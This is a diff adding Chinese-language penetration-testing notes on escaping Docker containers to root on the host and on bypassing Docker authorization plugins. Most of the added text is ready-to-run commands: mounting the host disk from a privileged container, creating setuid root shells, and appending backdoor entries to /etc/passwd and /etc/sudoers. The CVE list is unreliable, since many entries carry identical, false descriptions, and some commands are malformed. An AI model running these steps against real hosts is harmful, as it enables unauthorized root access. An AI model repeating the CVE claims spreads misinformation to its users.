@@ -601,6 +601,137 @@ WORKDIR /proc/self/fd/8
 
 Other
 
-CVE-2022-0492
++ CVE-2022-0492
++ CVE-2014-9356
++ CVE-2019-14271
++ CVE-2016-5195
+
 
 ## Docker提权
+
+1.root权限容器
+
+Docker启动选项
+```Bash
+docker run --rm -u 0 -it --privileged [镜像] /bin/bash
+```
+
+
+容器内执行
+```Bash
+mkdir -p /docker
+mount /dev/sda1 /docker
+cd /docker
+cp /bin/bash .
+chown root:root bash
+chmod 4777 bash
+./bash -p
+```
+
+2.mknod
+
+Docker启动选项
+```Bash
+docker run --rm -u 0 -it --privileged [镜像] /bin/bash
+```
+
+容器内执行
+```Bash
+mknod sda b 8 0
+chmod 777 sda
+echo "snowwolf:x:1000:1000:snowwolf,,,:/home/snowwolf:/bin/bash" >> /etc/passwd
+echo "ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+su snowwolf
+/bin/sh
+```
+
+宿主机上执行
+```Bash
+ps auxf | grep /bin/sh
+grep -a '用户:\$y\$j9T\$.*' /proc/进程ID/root/sda
+```
+
+Other
+
++ CVE-2019-5736：此漏洞允许攻击者逃离容器并获得主机系统的 root 权限。当容器内的用户可以写入 Docker 套接字时允许他们在主机上执行任意命令
+
++ CVE-2019-14271：此漏洞允许攻击者将权限从容器提升到主机系统。当容器内的用户可以写入文件时/etc/docker/daemon.json允许他们将 Docker 守护程序配置为以提升的权限运行
+
++ CVE-2020-15257：此漏洞允许攻击者将权限从容器提升到主机系统。当容器内的用户可以写入文件时/etc/crontab允许他们安排以提升的权限运行的 cron 作业
+
++ CVE-2020-2732：此漏洞允许攻击者将权限从容器提升到主机系统。当容器内的用户可以写入文件时/etc/passwd允许他们创建具有提升权限的新用户
+
++ CVE-2021-3449：此漏洞允许攻击者将权限从容器提升到主机系统。当容器内的用户可以写入文件时/etc/sudoers允许他们配置 sudo 以向用户授予提升的权限
+
++ CVE-2021-41091：此漏洞允许攻击者将权限从容器提升到主机系统。当容器内的用户可以写入文件时/etc/docker/daemon.json允许他们将 Docker 守护程序配置为以提升的权限运行
+
++ CVE-2022-24769：此漏洞允许攻击者将权限从容器提升到主机系统。当容器内的用户可以写入文件时/etc/crontab允许他们安排以提升的权限运行的 cron 作业
+
++ CVE-2022-36109：此漏洞允许攻击者将权限从容器提升到主机系统。当容器内的用户可以写入文件时/etc/passwd允许他们创建具有提升权限的新用户
+
+工具：
+
+[CDK](https://github.com/cdk-team/CDK)
+
+[Deepce](https://github.com/stealthcopter/deepce)
+
+[grype](https://github.com/anchore/grype)
+
+[amicontained](https://github.com/genuinetools/amicontained)
+
+[linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+
+## Docker Auth插件绕过
+
+枚举访问：
+
+[Docker auth profiler](https://github.com/carlospolop/docker_auth_profiler)
+
+1.系统管理员禁止用户挂载卷和使用特权
+```Bash
+docker run -d --privileged modified-ubuntu
+docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
+See 'docker run --help'.
+```
+
+在正在运行的容器内创建一个 shell 并赋予它额外的权限:
+```Bash
+docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
+#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
+
+# 使用 --privileged 运行shell
+docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
+# 使用 --cap-add=ALL
+docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
+# 使用 --cap-add=SYS_ADMIN
+docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
+```
+
+2.挂载可写文件夹
+
+在这种情况下，系统管理员不允许用户使用--privileged运行容器或为容器提供任何额外的功能，并且他只允许挂载/tmp文件夹
+
+宿主机
+```Bash
+cp /bin/bash /tmp  //创建BASH副本
+docker run -it -v /tmp:/host ubuntu:18.04 bash  //挂载主机的/tmp文件夹并获取shell
+```
+
+容器内
+```Bash
+chown root:root /host/bash
+chmod u+s /host/bash
+```
+
+宿主机
+```Bash
+/tmp/bash
+ -p  //获取到root权限的shell
+```
+
+---
+注意：
+可能无法挂载文件夹 /tmp，但可以挂载其他可写文件夹。可以使用以下命令查找可写目录：find / -writable -type d 2>/dev/null
+Linux 机器中并非所有目录都支持 suid 位，为了检查哪些目录支持 suid 位，请运行 mount | grep -v "nosuid" 例如，通常 /dev/shm 、 /run 、 /proc 、 /sys/fs/cgroup 和 /var/lib/lxcfs 不支持 suid 位
+如果可以挂载/etc或任何其他包含配置文件的文件夹，可以以 root 身份从 docker 容器更改它们，以便在主机中滥用它们并提升权限（可能修改 /etc/shadow）
+---
